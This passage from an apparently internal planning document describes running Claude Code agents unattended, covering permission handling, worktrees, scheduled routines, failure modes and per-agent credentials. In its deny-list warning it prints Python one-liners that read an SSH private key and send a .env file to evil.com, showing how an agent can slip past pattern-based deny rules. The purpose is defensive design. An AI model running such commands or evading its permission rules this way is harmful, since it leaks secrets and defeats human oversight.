- Creates a git worktree per agent (isolation primitive)
- Each agent runs inside a Docker container (sandbox)
- Docker bind-mounts the worktree (no file sync needed)
- **Staged orchestration pattern:** Planner -> Implementer -> Reviewer -> Merger
- **Branch strategies:** `head`, `merge-to-head`, `branch`
- `createWorktree()` API for lifecycle management
- Agent commits land on dedicated branches, then merge back
- Result: "889 commits, none of them hand-coded"

**Key detail:** Some people name worktrees and set up shell aliases (`za`, `zb`, `zc`) to hop between them in one keystroke. Others have a dedicated "analysis" worktree only for reading logs and running queries.

**Lock mechanisms for shared resources:** When multiple worktree agents run in parallel, they may contend on shared resources: a single PostgreSQL instance, Redis, Docker ports, or the same test database. Use file-based locks or port allocation to prevent collisions:

```bash
# File-based lock for shared database access
LOCK="/tmp/deepsecure-db-${SVC}.lock"
exec 200>"$LOCK"
flock -n 200 || { echo "Resource locked by another agent. Waiting..."; flock 200; }
# ... run migration or test ...
```

For DeepSecure, allocate distinct port ranges per worktree (e.g., worktree 1 → 8000/8002, worktree 2 → 8010/8012) via `.env` overrides in each worktree.

**Tmux-based headless pattern:** Instead of bare `&` backgrounding, map each worktree to a named tmux session for persistent, observable, and recoverable agent execution:

```bash
# Spawn N agents in named tmux sessions (one per worktree)
for i in 1 2 3; do
  tmux new-session -d -s "agent-$i" \
    "cd /path/to/worktree-$i && claude --print --prompt-file ralph-prompt.md --max-turns 80"
done

# Observe any agent: tmux attach -t agent-2
# List all agents: tmux list-sessions
# Kill one agent:  tmux kill-session -t agent-3
```

Tmux sessions survive terminal disconnection, can be observed in real-time, and integrate cleanly with Noah Zweben's `claude --worktree --tmux` flag. This is strictly superior to `&` backgrounding for AFK workloads.

---

### 5. Permission Handling That Doesn't Block

AFK operation breaks down completely when the agent hits a permission prompt and waits forever for human input. This is the single biggest blocker for going AFK.

| Approach | Who Uses It | How It Works |
|----------|-------------|--------------|
| `/permissions` allowlist | Boris Cherny | Pre-approve safe commands so they never prompt |
| `Notification` hook (permission_prompt matcher) to Slack | Boris Cherny | Route risky prompts to phone for approval while AFK |
| Auto-approve via Opus 4.5 hook | Boris Cherny | Hook sends permission request to a model that scans for attacks and auto-approves safe ones |
| Permission bubbling | Agent AFK (Piccolo) | Nested subagents forward permission requests up to parent/user |
| `--permission-mode auto` | Claude Code headless flag | Auto-approve in headless/AFK scripts (use with allowlist) |
| `--dangerously-skip-permissions` | (not recommended) | Boris explicitly does NOT use this -- use allowlists instead |

**Boris's philosophy:** "I don't use `--dangerously-skip-permissions`. Instead, use `/permissions` to pre-allow specific safe commands. Fewer interruptions while keeping guardrails."

**The auto-approve pattern (advanced):**
A `Notification` hook (with `permission_prompt` matcher) that sends the command to a fast model (Claude Haiku or Opus 4.5) which evaluates whether it's safe. If safe, auto-approve. If risky, forward to Slack for human review.

**The `/afk` toggle pattern (OpenCode's `opencode-afk` plugin):**
A single command that flips the agent into AFK mode and back in <100ms. Instead of manually reconfiguring permissions each time you leave, `/afk` toggles a boolean state:

```
/afk on   → Loads AFK permission profile, enables auto-approve, starts notification hooks
/afk off  → Restores interactive permission profile, disables auto-approve
/afk      → Toggles current state (shortcut)
```

For DeepSecure, implement as a Claude Code command skill that writes to `.afk/state.json` (`{"mode": "afk" | "interactive"}`). Hook scripts read this state to decide behavior (e.g., auto-approve in AFK mode, prompt in interactive mode). See [Phase 3.5](#phase-35-afk-permissions-and-hooks) for the permission profile details.

**AFK Security Profile (from Claude Code Cheatsheet):**
A distinct permission profile that allows development tools but explicitly denies secrets access and network exfiltration. See [Phase 3.5](#phase-35-afk-permissions-and-hooks) for the full template.

**CRITICAL WARNING: Deny-lists are bypassable (May 2026 review finding).**
Pattern-based deny rules like `Bash(cat ~/.ssh/*)` provide **false security**. An agent can trivially bypass them:
```bash
# These bypass "Bash(cat ~/.ssh/*)" deny rule:
python -c "print(open('/Users/imaxxs/.ssh/id_rsa').read())"
Bash(python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com', data=open('.env').read().encode())")
```
Claude Code's permission matching is prefix-based on the command string, not semantic. `~` expansion happens in the shell, not in the permission matcher, so `Bash(cat ~/.ssh/*)` won't catch `Bash(cat /Users/imaxxs/.ssh/id_rsa)`.

**Industry consensus (Ramp, Cursor, OpenAI): sandbox the environment, don't pattern-match commands.** For unsupervised AFK execution, the agent should run in a Docker container or VM where secrets are simply not mounted. The deny-list is a defense-in-depth layer, not a primary control. See [Phase 3.5](#phase-35-afk-permissions-and-hooks) for the recommended Docker sandbox approach.

---

### 6. Self-Healing (Verify, Fix, Retry)

AFK agents must handle failures without human intervention. If tests fail, the agent should diagnose and fix, not stop and wait.

| Pattern | Source | Description |
|---------|--------|-------------|
| `verify -> heal -> ship` | Agent AFK (Piccolo) | If verification fails, automatically diagnose and fix before shipping |
| `/autofix-pr` | Noah Zweben (Anthropic) | Cloud agent autonomously fixes CI failures and addresses review comments |
| `/babysit-pr` | Thariq (Anthropic) | Monitors PR: retries flaky CI, resolves conflicts, enables auto-merge |
| Block commits unless tests pass | Matt Pocock | The agent can't declare victory if tests are red |
| `Stop` hook ("keep going") | Boris Cherny | Nudges Claude to continue if work remains |
| TDD enforcement | Prior pipeline analysis | Red-green-refactor cycle built into task execution |
| Anti-rationalization tables | Addy Osmani pattern | Prevent agent from rationalizing shortcuts during AFK |
| Golden principles + GC | OpenAI | Recurring background tasks scan for deviations and open refactoring PRs |

**Noah Zweben's /autofix-pr lifecycle:**
1. Developer finishes a PR locally
2. Runs `/autofix-pr` -- entire session (conversation, edits, reasoning) ships to the cloud
3. The autofixer autonomously fixes CI failures and addresses review comments
4. Developer walks away and comes back to a green PR

**Thariq's /babysit-pr skill:**
- Monitors PR after creation
- Retries flaky CI runs
- Resolves merge conflicts
- Enables auto-merge when all checks pass
- You literally walk away after opening the PR

**OpenAI's agent-to-agent review:**
Over time, almost all review becomes agent-to-agent. The Ralph Wiggum loop at OpenAI: agent writes code, reviews its own changes, requests additional agent reviews, responds to feedback, iterates until all agent reviewers are satisfied, then merges. Humans may review but aren't required. This is where AFK matures toward L5 (Dark Factory).

**Huntley's "Evolutionary Software" (Loom concept):**
The most advanced self-healing: the loop identifies a problem, studies the codebase, fixes it, deploys it, verifies it worked -- automatically. This is L5 Dark Factory aspiration. Relevant as a long-term target for DeepSecure.

**Fast-merge philosophy:** When agent throughput exceeds human review capacity, traditional blocking merge gates (mandatory human approval, long CI pipelines) become the bottleneck. The fast-merge approach inverts the model:

| Traditional | Fast-Merge (AFK) |
|-------------|------------------|
| Block merge until human approves | Merge after automated checks pass |
| Long CI pipeline (30+ min) | Fast CI (< 5 min) + post-merge verification |
| Revert is exceptional | Automated rollback is routine |
| Large PRs | Small incremental PRs (easier to verify, easier to revert) |

**Blast radius limiting** supports fast-merge by ensuring any bad merge has minimal impact:
- **Small incremental PRs:** Each PR touches one concern, making automated verification more reliable and rollback trivial
- **Feature flags:** New behavior behind flags allows merge without activation
- **Anomaly detection:** Post-merge monitoring triggers automatic rollback on error-rate spikes
- **Lineage records:** Every agent-generated PR records its source task, prompt, and verification results for audit trail

**The Day Shift / Night Shift pattern:** A formal separation of human and agent operating modes:
- **Day Shift (human):** Planning, architecture, spec writing, reviewing blocked items, updating CLAUDE.md/skills based on overnight learnings
- **Night Shift (agent):** Autonomous execution of the Ralph loop, PR babysitting, CI fixing, doc gardening
- The handoff artifact is the `ralph_progress.json` file (JSON format, see Principle 12) — humans update it during the day, agents consume and update it overnight

This maps to Shapiro's L4: "You write a spec. You argue with it about the spec. You craft skills... Then you leave for 12 hours."

**Anti-rationalization tables (Osmani pattern):**
During AFK execution, agents may rationalize skipping steps (e.g., "tests aren't needed for this small change"). Anti-rationalization tables are explicit rules embedded in skills that list common rationalizations and why they're wrong:

```markdown
## Anti-Rationalization Table
| Agent Might Say | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "Tests aren't needed for this change" | Every change needs tests in this repo | Write at least one test |
| "I'll fix the lint errors later" | Later never comes in AFK | Fix before committing |
| "This import cycle is fine" | Import cycles break the build | Refactor to eliminate |
```

---

### 7. Notification When Stuck or Done

You can't be AFK if you don't know when to come back.

| Method | Who Uses It | Pros | Cons |
|--------|------------|------|------|
| iTerm2 system notifications | Boris Cherny | Built-in, zero setup | macOS only, must be at laptop |
| Telegram messages | Agent AFK (Piccolo) | True mobile AFK | Extra service dependency |
| Slack bot with custom emojis | Ramp Inspect | Team-wide visibility | Requires webhook setup |
| Monitor tool (event-driven) | Noah Zweben (Anthropic) | Token-efficient, real-time | Claude Code specific |
| macOS `osascript` notifications | Common pattern | Simple, built-in | macOS only |
| Remote Control | Noah Zweben | Start local, continue from phone | Requires claude.ai account |

**The Monitor tool (Noah Zweben):** Claude can spawn a background watcher script. Every line of stdout streams back as a real-time event. Claude reacts immediately. Massive token saver because it replaces polling loops. Use cases: follow logs for errors, poll PR statuses, watch directory changes, monitor dev servers.

**Noah's Remote Control:** Start local sessions from the terminal, then continue them from your phone via the Claude iOS app. Combined with Boris's "Teleport" (`&` command or `--teleport` flag), this means you can kick off AFK work on your machine and monitor/approve from your phone.

---

### 8. CLAUDE.md as Table of Contents, Not Encyclopedia

OpenAI keeps their AGENTS.md to ~100 lines, pointing to structured docs/. Matt Pocock recommends moving code standards to `CODE_STANDARDS.md` and running them through a reviewer agent on PRs instead of bloating the implementation context.

**OpenAI's approach:**
- AGENTS.md is the "table of contents" (~100 lines)
- `docs/` directory is the "system of record"
- Cross-linked documentation mechanically enforced through linters and CI
- **Progressive disclosure:** agents start with a small, stable entry point and are taught where to look next
- Agents load what they need, when they need it

**OpenAI's key metric:** ~1,500 PRs merged, 3.5 PRs/engineer/day, ~1M lines of code, zero manually-written. With 6+ hour autonomous runs.

**Matt Pocock's token optimization:**
> "Want to put something in CLAUDE.md? Stick it in CODE_STANDARDS.md instead. Then pass it to a reviewer agent that runs on every PR. Save tokens during implementation, spend them during review."

**Boris Cherny on CLAUDE.md as compounding engineering:**
> "Every project needs a CLAUDE.md checked into git. When Claude gets something wrong, fix it, then ask Claude to update CLAUDE.md so it never happens again. Every caught mistake becomes future prevention."

The tension: CLAUDE.md should compound learnings, but it shouldn't grow unbounded. The solution is the OpenAI pattern -- keep the root file slim and pointer-rich, with detailed rules in referenced files that agents load on demand.

**CRITICAL CAVEAT (May 2026 review finding):** Claude Code auto-loads `CLAUDE.md` at session start but does **NOT** auto-load referenced files. If you split CLAUDE.md and move critical rules (token types, backend conventions) to `docs/TOKEN_TYPES.md`, every fresh Ralph iteration starts WITHOUT those rules — unless:
1. A `SessionStart` hook pre-loads critical reference files, OR
2. The ralph-prompt explicitly instructs the agent to read them

**Do NOT split CLAUDE.md until you have a verified loading mechanism.** The split without a loader is a regression from the monolithic CLAUDE.md that ensures rules are always loaded. See [Phase 5](#phase-5-claudemd-refactoring-openai-pattern) for the prerequisite.

---

### 9. Dynamic Workflows (Claude Code, May 2026)

**NEW (May 28, 2026):** Claude Code now supports JavaScript orchestration scripts that the agent writes for your task, executed by a separate runtime in the background. Launched alongside Opus 4.8, this is the most significant change to Claude Code's autonomous capabilities. Requires **v2.1.154+**.

**How it works:**
- Claude writes the orchestration script; a separate runtime executes it in the background
- Up to **16 concurrent subagents** per workflow, max 1,000 agents total per run
- Subagents inherit your tool allowlist and run in `acceptEdits` mode (file edits auto-approved; shell commands and MCP tools not in allowlist can still prompt)
- Intermediate results stay in script variables, isolated from Claude's context window
- Workflows are resumable within the same session
- Saved workflows stored in `.claude/workflows/` (project) or `~/.claude/workflows/` (global) — reusable like slash commands
- `alt+w` bypasses workflow routing if triggered accidentally

**Activation methods:**

| Method | How | When |
|--------|-----|------|
| Direct prompt | Include "workflow" in your prompt | On-demand |
| `/effort ultracode` | Combines `xhigh` reasoning + automatic workflow orchestration | For substantive tasks |
| `/deep-research` | Built-in fan-out web research workflow | For research tasks |
| Agent SDK | `"ultracode": true` in settings | Programmatic |

**Boris Cherny's 6 Composition Patterns:**

| # | Pattern | How It Works | Best For |
|---|---------|-------------|----------|
| 1 | **Classify-and-act** | Classifier agent decides task type, routes to different agents/behavior | Mixed workloads, triage |
| 2 | **Fan-out-and-synthesize** | Split into parallel clean-context agents, merge structured outputs at barrier | Research, exploration |
| 3 | **Adversarial verification** | Separate agent challenges each output against a rubric (counters self-preferential bias) | Code review, security audit |
| 4 | **Generate-and-filter** | Multiple candidate solutions, filter by rubric/verification | Approach exploration |
| 5 | **Tournament** | Competing agents, pairwise comparison by judges until winner | Optimization, best-of-N |
| 6 | **Loop until done** | Iterative agents until stopping conditions met | Converging tasks |

**Key primitives:** `agent()`, `parallel([fns])`, `pipeline(items, ...stages)`. Per-agent control: model selection, worktree isolation, token budgets (e.g., `"use 10k tokens"`).

**Failure modes addressed:**
- **Agentic laziness** — premature task completion claims (adversarial verification catches)
- **Self-preferential bias** — overvaluing own results during verification (separate verifier agent)
- **Goal drift** — fidelity loss post-compaction (fresh-context subagents)

**Proof at scale:** Jarred Sumner ported Bun from Zig to Rust using dynamic workflows: 750,000 lines, 99.8% test pass rate, 11 days.

**What this replaces:**

| Phase 6 Script | Dynamic Workflow Equivalent |
|----------------|----------------------------|
| `parallel-build.sh` + worktrees | Single `workflow` prompt spawns N subagents |
| `parallel-build-tmux.sh` | Built-in — no tmux needed |
| `merge-parallel.sh` | Subagents commit to branches, workflow merges |
| Manual tmux session management | Automatic lifecycle management |

**What this does NOT replace:**
- The Ralph loop (fresh context per iteration) — workflows run within a session
- The planning pipeline (`/run-plan`, `/breakdown-design`) — workflows are execution, not planning
- Merge point verification — workflows don't know about `execute_merge_point.sh`
- Docker sandbox isolation — workflows run in the host environment

**Recommended approach:** Use Dynamic Workflows for intra-batch parallelism (multiple independent tasks within one batch), but keep the Ralph loop for inter-batch sequencing (fresh context between batches). Consider the fan-out-and-synthesize pattern for DeepSecure's dual-service architecture (parallel control plane + gateway tasks).

---

### 10. Routines (Cloud-Based Scheduled Agents)

**NEW (April 14, 2026 — Research Preview):** Routines are cloud-based agents that run on Anthropic infrastructure. They persist when your laptop is closed, when you're away, when you're sleeping. This is the closest to true AFK — no local machine required.

**Three trigger types:**

| Trigger | How | Example |
|---------|-----|---------|
| **Scheduled** | Hourly, daily, weekdays, weekly, custom cron, one-off timestamp | `daily at 9am: review open PRs` |
| **API** | HTTP POST to per-routine endpoint with bearer token | Sentry alert → routine fires |
| **GitHub** | `pull_request` or `release` events with filters | New PR → auto-review |

**GitHub event filters:** author, title, body, base branch, head branch, labels, is draft, is merged. Operators: equals, contains, starts with, is one of, is not one of, matches regex.

**CLI commands:**

```bash
# Create scheduled routine conversationally
/schedule

# Create with description
/schedule daily PR review at 9am

# One-off future task
/schedule in 2 weeks, open a cleanup PR

# List routines
/schedule list

# Trigger immediately
/schedule run

# Update existing routine (can set custom cron)
/schedule update
```

**API trigger example:**

```bash
curl -X POST https://api.anthropic.com/v1/claude_code/routines/trig_01.../fire \
  -H "Authorization: Bearer sk-ant-oat01-xxxxx" \
  -H "anthropic-beta: experimental-cc-routine-2026-04-01" \
  -H "anthropic-version: 2023-06-01" \
  -H "Content-Type: application/json" \
  -d '{"text": "Sentry alert SEN-4521 fired in prod."}'
# Returns: {"type": "routine_fire", "claude_code_session_id": "...", "claude_code_session_url": "..."}
```

**Daily caps:**

| Plan | Runs/Day | One-Off Exempt? |
|------|----------|----------------|
| Pro | 5 | Yes |
| Max | 15 | Yes |
| Team/Enterprise | 25 | Yes |

**Constraints:**
- Minimum cron interval: 1 hour
- Default push only to `claude/`-prefixed branches (configurable per repo)
- All MCP connectors included by default — remove unneeded ones
- Network access: Default "Trusted" allowlist, configurable to Custom or Full
- Admins can disable via toggle at `claude.ai/admin-settings/claude-code`

**AFK implications for DeepSecure:**

| Use Case | Routine Setup |
|----------|---------------|
| Overnight PR review | `/schedule daily at 11pm: review all open PRs on dev branch` |
| CI failure auto-fix | GitHub trigger on `pull_request` with failing checks |
| Docs sync | `/schedule weekdays at 6am: sync API docs with implementation` |
| Security scan | `/schedule daily: run bandit and safety check, open PR if issues found` |
| Dependency updates | `/schedule weekly: check for dependency updates, test, open PR` |

**Routines vs Ralph loop:** Routines run on Anthropic's cloud — no laptop, no `caffeinate`, no crash recovery needed. But they have daily caps and limited local environment access. Use Routines for recurring maintenance tasks; use Ralph for intensive multi-task workstreams that need full dev environment access.

---

### 11. Agent View and Background Sessions

**NEW (May 11, 2026 — Research Preview):** Agent View (`claude agents`) provides a unified terminal dashboard for managing all Claude Code sessions — foreground, background, and interactive. Requires **v2.1.139+**.

**Core commands:**

| Command | Function |
|---------|----------|
| `claude agents` | Open the dashboard |
| `claude --bg "prompt"` | Launch session directly to background |
| `claude --bg --name "name" "prompt"` | Background session with display name |
| `claude --bg --exec 'command'` | Run shell command as background job (no model) |
| `claude --bg --agent <name> "prompt"` | Run specific subagent as background session |
| `claude attach <id>` | Attach to session |
| `claude logs <id>` | View recent output |
| `claude stop <id>` / `claude kill <id>` | Stop session |
| `claude respawn <id>` | Restart with conversation intact |
| `claude respawn --all` | Restart all sessions (e.g., after binary update) |
| `claude rm <id>` | Remove session |
| `claude daemon status` | Supervisor state |

**In-session commands:**

| Command | Action |
|---------|--------|
| `/bg` or `/background` | Move current session to background |
| `left-arrow` on empty prompt | Background and open agent view |
| `/stop` | End a background session from inside |

**Session states:** Working (animated), Needs input (yellow), Idle (dimmed), Completed (green), Failed (red), Stopped (grey). Process icons: `*` (alive), `.` (exited, restarts on attach), `+` (/loop session sleeping).

**Supervisor process:**
- Per-user, auto-starts, manages all background sessions
- Sessions preserved across terminal close, shell exit, and macOS sleep (but not shutdown)
- Idle sessions stopped after ~1 hour (pinned sessions exempt — `Ctrl+T` to pin)
- Auto-detects Claude Code binary updates and restarts into new version
- State stored at: `~/.claude/daemon.log`, `~/.claude/daemon/roster.json`, `~/.claude/jobs/<id>/`
- `CLAUDE_JOB_DIR` env var: each background session gets its own scratch directory at `$CLAUDE_JOB_DIR/tmp`

**Background session isolation:** Before editing files, Claude automatically moves background sessions into isolated git worktrees under `.claude/worktrees/`. Disable with `worktree.bgIsolation: "none"` setting (v2.1.143+).

**Dispatch input prefixes (from agent view):**
- `<agent-name> <prompt>` — run as that subagent
- `@<agent-name>` — mention subagent anywhere in prompt
- `@<repo>` — target specific repo directory
- `/<command>` — suggest skills/commands
- `! <command>` — run shell command as background job
- `#<number>` or PR URL — select existing session for that PR

**Configuration flags carry through to background:** `--mcp-config`, `--settings`, `--add-dir`, `--plugin-dir`, `--fallback-model`, `--permission-mode`, `--model`, `--effort`, `--agent`.

**AFK implications for DeepSecure:**

| Old AFK Pattern | New Agent View Pattern |
|-----------------|----------------------|
| `nohup ralph.sh &` + `caffeinate` | `claude --bg --name "ws-a1" "prompt"` — supervisor handles lifecycle |
| `tmux` sessions for parallel agents | Agent View dashboard — all sessions in one view |
| Manual crash recovery (`afk-recover.sh`) | `claude respawn <id>` or `claude respawn --all` |
| `ralph_progress.json` polling | Agent View shows session state in real-time |
| SSH/remote terminal for monitoring | `claude agents --json` for scripting, `claude logs <id>` for output |

**Session forking for safety:**
```bash
# Fork before risky operation — original session preserved if it fails
claude --resume <id> --fork-session
```
`/branch` does the same from within a session. Both create independent copies with all context preserved — a safety mechanism for AFK agents attempting risky operations.

---

**Skill engineering discipline:** Skills are not throwaway markdown files — they are engineered artifacts with quality requirements:

| Skill Engineering Practice | Why It Matters |
|---------------------------|----------------|
| **Mandatory `gotchas.md` per skill directory** | Domain-specific pitfalls the agent would otherwise rediscover each run (e.g., Ed25519 gotchas for crypto skills) |
| **Run logging/telemetry in every skill execution** | Track success rates, failure modes, execution time — feeds back into skill improvement |
| **Semantic deduplication before task execution** | Before an agent starts a task, check if identical or substantially similar work exists — prevents redundant effort |
| **Structured constraints (tables over prose)** | Tables are mechanically parseable; prose rules are ambiguous. Prefer `| Constraint | Value |` over "you should try to..." |
| **Skill quality scoring via marketplace plugins** | Automated rubrics scoring skills on dimensions: completeness, error handling, anti-rationalization coverage, gotchas depth |

```
.claude/skills/
├── code-review-and-quality/
│   ├── skill.md              # Main skill instructions
│   ├── gotchas.md            # Domain-specific pitfalls
│   ├── anti-rationalization.md  # Common shortcuts to block
│   └── telemetry.sh          # Run logging script
├── run-tests/
│   ├── skill.md
│   ├── gotchas.md
│   └── pytest-patterns.md    # Reference patterns
└── deploy/
    ├── skill.md
    ├── gotchas.md
    └── rollback-runbook.md
```

**Ryan Carson's skills decay warning:**
> "Skills decay. A Next.js skill from six months ago may conflict with your current component library. He'd gladly pay for a system that audits his skills library, flags conflicts, and surfaces what's gone stale."

This applies to DeepSecure's CLAUDE.md and skills -- they need a staleness audit mechanism (see `doc-gardener` agent in Phase 4).

---

## Production Failure Modes

Real-world AFK workflows fail in ways that testing doesn't predict. These are documented failure modes from production deployments:

### The 50-Day Silent Degradation (March-April 2026)

Three overlapping Anthropic product-layer changes caused quality collapse without any model change:

| Date | Change | Impact | Reverted |
|------|--------|--------|----------|
| March 4 | Reasoning effort downgraded (high → medium) for UI latency | Reduced thinking depth | April 7 |
| March 26 | Caching bug — thinking blocks cleared every turn instead of once per idle session | 900K token users faced full cache misses every turn | April 10 |
| April 16 | System prompt verbosity limit ("keep text to 25 words between tool calls") | 3% quality drop measured | April 20 |

Independent audit (Stella Laurenzo, AMD): 6,852 sessions. Median visible thinking collapsed 73% (2,200 chars → 600 chars). API calls required up to 80x more retries. Claude shifted from research-first to edit-first behavior.

**Lesson:** AFK workflows need their own quality monitoring independent of Anthropic's platform health. Track: thinking depth, retry frequency, task completion rate, output token counts.

### Silent Model Fallbacks

Claude Code silently falls back from Opus to Sonnet when usage caps are hit. In automated pipelines, this quality drop remains invisible until 3+ tasks downstream when outputs start failing verification.

**Mitigation:** Check model identity in `--output-format json` output. Alert when the model changes mid-workflow.

### Context Compaction Destroys Session State

Rules set via conversation ("don't modify file X", "always run tests before committing") are summarized and eventually dropped during compaction. Only CLAUDE.md content survives (re-injected at session start).

**Mitigation:** All critical AFK constraints must be in CLAUDE.md or the ralph-prompt.md file, never set conversationally.

### Debugging Loops Without Session Budgets

Without a session length budget, debugging loops can run 90+ minutes. The model loses track of fixes already tried and re-suggests changes rejected 40 messages earlier.

**Mitigation:** Set `--max-turns` and `--max-budget-usd` on every AFK session. The Ralph pattern enforces this structurally (fresh context each iteration).

### AFK-Specific Anti-Patterns

| Anti-Pattern | Symptom | Fix |
|-------------|---------|-----|
| No cost ceiling | $50+ overnight bill | `--max-budget-usd` per iteration |
| No turn limit | 200-turn debugging spiral | `--max-turns 50` |
| Silent Opus→Sonnet | Quality drops 3 tasks later | Check model in JSON output |
| Conversational constraints | Rules vanish after compaction | Put in CLAUDE.md |
| No dirty-tree guard | Agent builds on broken state | `git status --short` check at iteration start |
| No stdin redirect | Background agent hangs silently | `< /dev/null` on every headless invocation |
| Infinite retry loop | Agent retries same fix forever | Circuit breaker (Ralph v0.11.5 pattern) |

---

## AFK Cost Economics

**CRITICAL (Effective June 15, 2026):** Headless `claude -p` invocations draw from a separate Agent SDK credit pool, not the interactive subscription.

### Credit Pools

| Plan | Interactive (Terminal) | Agent SDK (`claude -p`, GitHub Actions, SDK apps) |
|------|----------------------|---------------------------------------------------|
| Pro ($20/mo) | Included in subscription | $20/month separate pool |
| Max 5x ($100/mo) | Included | $100/month separate pool |
| Max 20x ($200/mo) | Included | $200/month separate pool |

### What Counts as Agent SDK

| Usage | Pool |
|-------|------|
| Interactive `claude` terminal | Interactive (subscription) |
| `claude -p "prompt"` (headless) | **Agent SDK** |
| Claude Code GitHub Actions | **Agent SDK** |
| Python/TypeScript Agent SDK | **Agent SDK** |
| Routines (`/schedule`) | Cloud infrastructure (separate) |

### Cost Estimation for AFK

Approximate token costs at API rates (Opus 4.8: $5/$25 per MTok input/output):

| AFK Pattern | Est. Cost/Iteration | Pro Budget Lasts |
|-------------|--------------------|--------------------|
| Simple Ralph iteration (50 turns) | $0.50-2.00 | 10-40 iterations |
| Complex Ralph iteration (80 turns) | $2.00-5.00 | 4-10 iterations |
| Dynamic Workflow (16 subagents) | $5.00-15.00 | 1-4 runs |
| Overnight Ralph (10 iterations) | $5.00-20.00 | 1-4 nights |

**When credits exhaust:** Automated requests fail silently. No queue, no fallback model, no real-time notification. The AFK agent simply stops working.

**Overflow configuration:** Opt-in "usage credits" toggle (OFF by default) bills additional usage at API rates. Enable at `claude.ai/settings`.

### Cost Monitoring for AFK

```bash
# Track per-iteration costs in ralph.sh
ITERATION_OUTPUT=$(claude --print --output-format json --prompt-file ralph-prompt.md --max-budget-usd 5.00 < /dev/null)
COST=$(echo "$ITERATION_OUTPUT" | jq -r '.usage.cost // "unknown"')
echo "Iteration $i cost: $COST" >> .afk/cost-log.txt

# Alert if approaching budget
TOTAL_COST=$(awk '{sum += $NF} END {print sum}' .afk/cost-log.txt)
if (( $(echo "$TOTAL_COST > 15" | bc -l) )); then
  scripts/notify.sh "AFK Cost Alert" "Total spend: \$$TOTAL_COST" urgent
fi
```

---

## Where DeepSecure Sits on Shapiro's Five Levels

Dan Shapiro's framework maps organizations from "spicy autocomplete" (L0) to "dark factory" (L5):

| Level | Name | Description | DeepSecure Status |
|-------|------|-------------|-------------------|
| L0 | Manual | Human-controlled, minimal AI | Past this |
| L1 | Assisted Tasks | Delegating discrete tasks (tests, docs) | Past this |
| L2 | Collaborative Pairing | AI as junior colleague, flow state | Past this |
| **L3** | **Human-in-Loop Manager** | **Developer becomes code reviewer. "Your life is diffs."** | **Current state** |
| L4 | Asynchronous Autonomy | Write spec, walk away, check tests in 12 hours | **Target** |
| L5 | Dark Factory | Fully autonomous, "humans neither needed nor welcome" | Future aspiration |

**Current state (L3):** DeepSecure has a sophisticated pipeline (`/run-plan` then `/breakdown-design` then `/run-batch` then `/execute-task`), but each step requires human invocation. The human is managing, not coding, but still present.

**Target (L4):** Write a design doc, invoke a single command, and walk away. The system plans, decomposes, executes in parallel, self-heals on test failures, and notifies when done or stuck. Shapiro describes L4: "You write a spec. You argue with it about the spec. You craft skills... Then you leave for 12 hours, and check to see if the tests pass."

**L3 to L4 gap:** Automated orchestration + self-healing + notification. The planning infrastructure is there; the autonomous execution loop is not.

**L5 aspiration (Huntley's Loom):** The loop identifies problems, studies the codebase, fixes them, deploys, and verifies -- automatically. Combined with OpenAI's agent-to-agent review where humans aren't required, this is the "dark factory" where specs go in and software comes out.

**Industry benchmarks (May 2026):**

| Company | L-Level | Key Metric | Source |
|---------|---------|------------|--------|
| OpenAI (internal) | L4-L5 | ~1M LOC, zero human-written, ~1,500 PRs, 5-10 PRs/engineer/day | [29] |
| Ramp (Inspect) | L4 | 40-50% of all merged PRs from agents, non-engineers shipping code | [28] |
| Cursor (internal) | L4 | 30-40% of PRs from cloud agents, 50M+ actions/day | [27] |
| Ryan Carson | L4 | 15 simultaneous Devin threads, $2-3k/month | [16] |
| Boris Cherny | L4 | 20-30 PRs/day normal, 150/day peak, hundreds of agents | [25] |
| Dan Shapiro (self-assessed) | L4 | Writes specs, walks away for 12 hours | [6] |
| **DeepSecure** | **L3** | Human present for each step invocation | Current |

**The L4 threshold is no longer aspirational for the industry** — multiple teams are operating there daily. The gap for DeepSecure is infrastructure (Ralph loop, notifications, permission handling), not capability.

---

## DeepSecure as AFK Security Infrastructure (Dog-Fooding)

DeepSecure's product — Identity-as-Code for AI agents — is precisely the security infrastructure that AFK agent swarms need. This creates a unique dog-fooding opportunity: use DeepSecure to secure DeepSecure's own AFK development.

### The Problem with Static Credentials in AFK

When multiple agents run in parallel across worktrees, they need access to shared services (databases, APIs, Docker registries, CI systems). The naive approach — static API keys in `.env` files — creates security risks:

- Agents running with overly broad credentials (violates least-privilege)
- Shared secrets across worktrees (one compromised agent exposes all)
- No audit trail of which agent accessed what
- No credential rotation during long AFK sessions
- No way to revoke a single agent's access without affecting others

### Zero-Trust AFK Identity

Replace static API keys in AFK sandboxes with DeepSecure's own Ed25519 identity system:

| Static Credentials (Current) | Zero-Trust AFK (Target) |
|------------------------------|------------------------|
| Shared `.env` per worktree | Per-agent Ed25519 keypair |
| No expiration | TTL-scoped `delegation_tokens` |
| Manual revocation | Automatic expiry + instant revocation |
| No audit trail | Immutable audit log per agent action |
| Same permissions for all agents | Scoped permissions per agent role |

### Implementation Pattern

```
Orchestrator (scripts/ralph.sh or scripts/parallel-build.sh)
  │
  ├── Generates Ed25519 keypair per worktree agent
  ├── Requests delegation_token from DeepSecure Control Plane
  │     scope: ["repo:read", "test:execute", "docker:build"]
  │     ttl: 3600  (1 hour, auto-renew on heartbeat)
  │     agent_id: "ralph-worktree-1"
  │
  ├── Injects identity into worktree environment
  │     DEEPSECURE_AGENT_ID=ralph-worktree-1
  │     DEEPSECURE_AGENT_KEY=/tmp/agent-1.key
  │     DEEPSECURE_DELEGATION_TOKEN=<token>
  │
  └── Agent authenticates to shared services via delegation_token
        (not static API keys)
```

### Why This Matters

1. **Least privilege:** Each agent gets only the permissions it needs for its specific task
2. **Temporal scoping:** Credentials expire after the AFK session ends
3. **Audit trail:** Every agent action is traceable to a specific delegation chain
4. **Blast radius:** A compromised agent's credentials are limited in scope and time
5. **Dog-fooding:** Every AFK session stress-tests DeepSecure's own product

### Hermes Agent as the Ideal Dog-Food Target

Hermes Agent (see [Phase 6](#hermes-agent-as-orchestration-layer)) is the perfect test harness for DeepSecure's product because it naturally creates **every security problem DeepSecure is designed to solve**: persistent agents with broad credentials, long-lived tokens, delegated authority, unaudited tool access, parallel agents, and remote execution.

**Without DeepSecure controls:**
```
Hermes Agent (dangerous)
  └── has broad GitHub token (read + write + admin)
  └── has Docker access (full daemon)
  └── has Slack webhook (can post anything)
  └── runs forever (no credential expiry)
  └── no audit trail of what it did or why
```

**With DeepSecure controls:**
```
Hermes Orchestrator
